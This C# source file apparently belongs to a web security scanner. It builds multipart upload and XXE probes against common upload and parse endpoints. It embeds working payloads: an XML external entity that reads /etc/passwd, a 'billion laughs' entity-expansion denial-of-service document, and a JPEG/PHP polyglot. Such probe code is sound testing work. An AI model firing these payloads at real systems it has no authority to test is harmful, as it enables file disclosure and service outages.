using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Shared multipart upload helpers for file-upload-scan and upload XXE probes.
/// </summary>
public static class UploadProbeSupport
{
    public const string DefaultBoundary = "----trowserUploadBoundary7MA4YWxkTrZu0gW";
    public const string XxeBoundary = "----trowserXxeBoundary7MA4YWxkTrZu0gW";

    public static readonly string[] AlwaysProbedUploadPaths =
    [
        "/file-upload",
        "/api/Complaints",
        "/api/Memorys",
        "/uploads",
        "/api/upload",
        "/api/Files",
        "/rest/admin/upload",
        "/api/import",
        "/import",
        "/api/files",
        "/upload"
    ];

    public static readonly string[] AlwaysProbedXxePaths =
    [
        "/file-upload",
        "/api/Complaints",
        "/rest/admin/upload",
        "/api/upload",
        "/upload",
        "/api/import",
        "/import",
        "/api/xml",
        "/api/parse"
    ];

    public static readonly string[] MultipartFieldNames = ["file", "filename"];

    public static readonly byte[] BaselinePdf =
        "%PDF-1.4\n%\xe2\xe3\xcf\xd3\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n"u8.ToArray();

    public static readonly byte[] OversizedPdf =
        BaselinePdf.Concat(Enumerable.Repeat((byte)'A', 200 * 1024).ToArray()).ToArray();

    public static readonly byte[] ExePayload =
        [0x4D, 0x5A, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00];

    public static readonly byte[] PolyglotJpegPhp =
    [
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10,
        .. "JFIF\x00\x01"u8,
        .. "<?php echo 'trowser-polyglot'; ?>"u8
    ];

    public static readonly byte[] BaselineXml = "<root>baseline</root>"u8.ToArray();

    public static readonly byte[] XxePasswdPayload = """
        <?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>&xxe;</root>
        """u8.ToArray();

    public static readonly byte[] XxeDosPayload = """
        <?xml version="1.0"?>
        <!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        ]>
        <root>&lol5;</root>
        """u8.ToArray();

    public static bool IsAccepted(int status) => status is 200 or 201;

    public static bool EndpointAbsent(int status) => status is 0 or 404;

    /// <summary>
    /// Paths that accept multipart bodies for render/SSTI/exec — not file storage.
    /// Status 200 alone must not become upload CRITICAL/HIGH.
    /// </summary>
    private static readonly string[] NonUploadPathTokens =
    [
        "/render", "/template", "/preview", "/ssti", "/eval", "/spawn", "/exec",
        "/command", "/shell", "/graphql", "/gql"
    ];

    public static bool LooksLikeNonUploadSink(string url)
    {
        if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
            return false;
        var path = uri.AbsolutePath.ToLowerInvariant();
        foreach (var token in NonUploadPathTokens)
        {
            if (path.Contains(token, StringComparison.Ordinal))
                return true;
        }

        return false;
    }

    /// <summary>
    /// True when the response body suggests the server stored or echoed an uploaded object
    /// (file id, download URL, upload path, or content-disposition metadata).
    /// </summary>
    public static bool LooksLikeUploadPersistence(string? body)
    {
        if (string.IsNullOrWhiteSpace(body)) return false;
        if (body.Length > 200_000) body = body[..200_000];

        // Reject obvious template/SSTI/error JSON that still returns 200.
        if (body.Contains("\"template\"", StringComparison.OrdinalIgnoreCase)
            && body.Contains("\"rendered\"", StringComparison.OrdinalIgnoreCase))
            return false;
        if (body.Contains("SyntaxError", StringComparison.OrdinalIgnoreCase)
            || body.Contains("TemplateError", StringComparison.OrdinalIgnoreCase))
            return false;

        // Require storage/oracle signals — bare "multipart"/"filename" echo alone is too weak.
        return body.Contains("\"fileId\"", StringComparison.OrdinalIgnoreCase)
               || body.Contains("\"file_id\"", StringComparison.OrdinalIgnoreCase)
               || body.Contains("\"uploadId\"", StringComparison.OrdinalIgnoreCase)
               || body.Contains("\"upload_id\"", StringComparison.OrdinalIgnoreCase)
               || body.Contains("\"downloadUrl\"", StringComparison.OrdinalIgnoreCase)
               || body.Contains("\"download_url\"", StringComparison.OrdinalIgnoreCase)
               || body.Contains("\"fileUrl\"", StringComparison.OrdinalIgnoreCase)
               || body.Contains("\"file_url\"", StringComparison.OrdinalIgnoreCase)
               || body.Contains("/uploads/", StringComparison.OrdinalIgnoreCase)
               || body.Contains("/files/", StringComparison.OrdinalIgnoreCase)
               || body.Contains("\"storage", StringComparison.OrdinalIgnoreCase)
               || body.Contains("content-disposition", StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// Accept for upload findings only when HTTP accept + (observed multipart traffic OR persistence oracle).
    /// Non-upload sinks never qualify.
    /// </summary>
    public static bool IsUploadFindingEligible(string url, int status, string? body, bool observedMultipart)
    {
        if (!IsAccepted(status)) return false;
        if (LooksLikeNonUploadSink(url)) return false;
        return observedMultipart || LooksLikeUploadPersistence(body);
    }

    /// <summary>
    /// Extract candidate URLs where an uploaded file might be served back (for execution/readback oracles).
    /// </summary>
    public static IEnumerable<string> ExtractLikelyUploadUrls(string uploadUrl, string? responseBody)
    {
        var results = new List<string>();
        if (!Uri.TryCreate(uploadUrl, UriKind.Absolute, out var baseUri))
            return results;

        var origin = baseUri.GetLeftPart(UriPartial.Authority);
        if (!string.IsNullOrEmpty(responseBody))
        {
            var body = responseBody.Length > 50_000 ? responseBody[..50_000] : responseBody;
            foreach (Match m in Regex.Matches(
                         body,
                         @"(?:href|src|url|location|path|file(?:name)?)\s*[""'=:\s]+[""']?(/?(?:uploads?|files?|media|static)/[^""'\s<>]+)",
                         RegexOptions.IgnoreCase))
            {
                var path = m.Groups[1].Value;
                if (path.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                    results.Add(path);
                else
                    results.Add(origin + (path.StartsWith('/') ? path : "/" + path));
            }

            foreach (Match m in Regex.Matches(
                         body,
                         @"https?://[^\s""'<>]+/(?:uploads?|files?|media)/[^\s""'<>]+",
                         RegexOptions.IgnoreCase))
            {
                results.Add(m.Value.TrimEnd('.', ',', ';', ')'));
            }
        }

        // Common static upload paths for the polyglot filename used by the probe.
        results.Add(origin + "/uploads/polyglot.jpg");
        results.Add(origin + "/uploads/polyglot.php");
        results.Add(origin + "/static/uploads/polyglot.jpg");
        results.Add(origin + "/files/polyglot.jpg");

        return results.Distinct(StringComparer.OrdinalIgnoreCase);
    }

    public static byte[] BuildMultipart(
        byte[] fileBytes,
        string fieldName,
        string filename,
        string contentType,
        string? boundary = null)
    {
        boundary ??= DefaultBoundary;
        var crlf = "\r\n"u8.ToArray();
        var parts = new List<byte[]>
        {
            Encoding.UTF8.GetBytes($"--{boundary}"),
            Encoding.UTF8.GetBytes($"Content-Disposition: form-data; name=\"{fieldName}\"; filename=\"{filename}\""),
            Encoding.UTF8.GetBytes($"Content-Type: {contentType}"),
            Array.Empty<byte>(),
            fileBytes,
            Encoding.UTF8.GetBytes($"--{boundary}--"),
            Array.Empty<byte>()
        };

        using var ms = new MemoryStream();
        for (var i = 0; i < parts.Count; i++)
        {
            if (i > 0) ms.Write(crlf);
            ms.Write(parts[i]);
        }

        ms.Write(crlf);
        return ms.ToArray();
    }

    public static async Task<string?> CaptureSpaShellFingerprintAsync(
        AutomationContext ctx,
        string origin,
        int timeoutMs,
        CancellationToken ct)
    {
        var canaryUrl = origin.TrimEnd('/') + "/this-path-definitely-does-not-exist-trowser-canary";
        try
        {
            var fetch = await SecurityProbeHttp.FetchAsync(ctx, canaryUrl, "GET", null, null, timeoutMs, true, ct);
            return fetch.Body;
        }
        catch
        {
            return null;
        }
    }

    public static bool LooksLikeSpaShell(string? body, string? shellFingerprint)
    {
        if (string.IsNullOrEmpty(shellFingerprint) || string.IsNullOrEmpty(body))
            return false;
        if (Math.Abs(body.Length - shellFingerprint.Length) > Math.Max(64, shellFingerprint.Length / 10))
            return false;
        var compareLen = Math.Min(500, Math.Min(body.Length, shellFingerprint.Length));
        return body.AsSpan(0, compareLen).SequenceEqual(shellFingerprint.AsSpan(0, compareLen));
    }

    public static List<string> DiscoverUploadEndpoints(AutomationContext ctx, string origin, int maxCandidates)
    {
        var paths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (var p in AlwaysProbedUploadPaths)
            paths.Add(NormalizePath(p));

        foreach (var entry in ctx.Network.Entries)
        {
            if (!entry.Method.Equals("POST", StringComparison.OrdinalIgnoreCase)) continue;
            if (!Uri.TryCreate(entry.Url, UriKind.Absolute, out var uri)) continue;
            if (!string.Equals(uri.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
                continue;

            var path = uri.AbsolutePath;
            if (string.IsNullOrEmpty(path)) continue;

            var ct = entry.RequestHeaders.TryGetValue("Content-Type", out var ctVal) ? ctVal
                : entry.RequestHeaders.GetValueOrDefault("content-type") ?? "";
            var looksUpload = ct.Contains("multipart", StringComparison.OrdinalIgnoreCase)
                              || path.Contains("upload", StringComparison.OrdinalIgnoreCase)
                              || path.Contains("file", StringComparison.OrdinalIgnoreCase)
                              || path.Contains("complaint", StringComparison.OrdinalIgnoreCase)
                              || path.Contains("memory", StringComparison.OrdinalIgnoreCase)
                              || path.Contains("import", StringComparison.OrdinalIgnoreCase);
            if (looksUpload && !LooksLikeNonUploadSink(uri.AbsoluteUri))
                paths.Add(NormalizePath(path));
        }

        return paths.Take(Math.Max(1, maxCandidates)).Select(p => origin.TrimEnd('/') + p).ToList();
    }

    public static List<string> DiscoverJsonPostSinks(AutomationContext ctx, string origin, int maxCandidates)
    {
        var sinks = InjectionPointDiscovery.DiscoverJsonEndpoints(ctx, origin, maxCandidates)
            .Select(p => p.Url)
            .ToList();

        foreach (var path in new[] { "/b2b/v2/orders", "/api/orders", "/api/serialize", "/api/deserialize", "/api/parse" })
            sinks.Add(origin.TrimEnd('/') + path);

        return sinks.Distinct(StringComparer.OrdinalIgnoreCase).Take(Math.Max(1, maxCandidates)).ToList();
    }

    public static int CountJsonPostEndpoints(AutomationContext ctx, string origin) =>
        InjectionPointDiscovery.DiscoverJsonEndpoints(ctx, origin, 50).Count;

    private static string NormalizePath(string path) =>
        path.StartsWith('/') ? path : "/" + path;

    public static string NormalizePathForProbe(string path) => NormalizePath(path);
}
